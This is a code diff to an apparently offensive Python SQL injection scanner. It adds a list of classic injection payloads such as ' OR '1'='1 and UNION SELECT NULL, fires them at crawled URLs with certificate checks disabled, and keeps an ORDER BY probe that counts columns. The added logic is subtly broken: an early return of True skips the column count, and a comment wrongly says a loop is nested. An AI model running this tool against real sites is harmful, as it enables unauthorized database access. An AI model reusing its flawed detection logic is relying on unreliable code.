@@ -73,13 +73,34 @@ def find_urls_to_test(url, base_url):
 
 # perform the sql injection
 def exploit_sqli_column_number(url):
+    payloads = [
+        "' OR '1'='1",
+        "' OR '1'='1' --",
+        "' OR 1=1 --",
+        '" OR "1"="1"',
+        '" OR "1"="1" --',
+        "' OR 'a'='a",
+        "' OR 'a'='a' --",
+        "1 OR 1=1",
+        "admin' --",
+        "' UNION SELECT NULL, NULL --"
+    ]
+
+    for payload in payloads:
+        target_url = url + payload
+        r = requests.get(target_url, verify=False, proxies=proxies)
+        if "Internal Server Error" in r.text:
+            print(f"[+] Vulnerable URL found with payload {payload}")
+            return True
+    
+    # Test order by columns (this is inside the loop)
     for i in range(1, 5):
         target_url = url + "'+order+by+%s--" % i
-        
         r = requests.get(target_url, verify=False, proxies=proxies)
         res = r.text
         if "Internal Server Error" in res:
             return i - 1
+        
     return False
 
 if __name__ == "__main__":
@@ -106,7 +127,7 @@ if __name__ == "__main__":
             num_col = exploit_sqli_column_number(test_url)
             if num_col:
                 print(f"[+] Vulnerable URL found: {test_url}")
-                print(f"[+] Pudimos determinar que su base de datos tiene {num_col} columnas en categoria {test_url}")
+                print(f"[+] Pudimos determinar que su base de datos tiene {num_col} columnas en esta url")
             else:
                 print(f"[-] URL not vulnerable: {test_url}")
     else:
